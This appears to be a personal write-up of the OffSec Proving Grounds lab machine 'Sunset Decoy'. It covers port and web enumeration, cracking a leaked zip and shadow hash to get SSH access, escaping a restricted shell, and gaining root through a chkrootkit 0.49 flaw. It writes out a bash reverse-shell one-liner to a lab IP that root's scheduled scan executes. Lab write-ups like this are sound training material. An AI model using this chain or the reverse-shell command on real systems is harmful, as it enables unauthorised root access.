---
title: OffSec PG - Sunset Decoy
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.80.85`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.85`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                       |
| -------- | ----------- | ------------------------------------------------ |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)   |
| 80       | HTTP        | Apache httpd 2.4.38 &rarr; *Identified file save.zip* |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.85 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

No results were listed.

---

## Exploitation

Retrieved the zip file using `curl http://192.168.80.85/save.zip --output save.zip`.

The zip file is locked. Therefore, cracking with fcrackzip and rockyou password list gives the password as `manuel`. Extracting it gives the files passwd, group, hostname, shadow and sudoers from the `/etc/` directory.

The users identified are `root` with bash and user `296640a3b825115a47b68fc44501c828` with restricted bash.

The shadow file contains the hashed password for the identified user. Therefore, sending the entry to john for cracking gives the credentials as `296640a3b825115a47b68fc44501c828:server`. This can be used for sshing into the server.

The shell received is a restricted shell. Tries many things to escape from the shell. The only thing that worked was to append `-t "bash"` to the ssh command. This allowed the use of `/` in commands and therefore `/bin/cat`, which gives the user flag.

---

## Privilege Escalation

[PSPY](https://github.com/DominicBreuker/pspy) can be run on the machine. This gives a number of processes running. By looking at the output, the process `/bin/sh /root/chkrootkit-0.49/chkrootkit` is being run for about 5 seconds every minute. This coincides with the AV scan being run using the honeypot binary in the user's home directory.

Searchsploit lists a privilege escalation exploit. This exploit states that a file can be created by the name `update` and made executable. It will be executed by `chkrootkit` whenever it is run. The file must be placed under the `/tmp/` directory.

Therefore, a reverse shell code can be inserted into the file &rarr; `/bin/bash -i >& /dev/tcp/192.168.49.80/3002 0>&1`.

After a minute, a reverse shell is obtained as `root`. This gives the root flag.

---
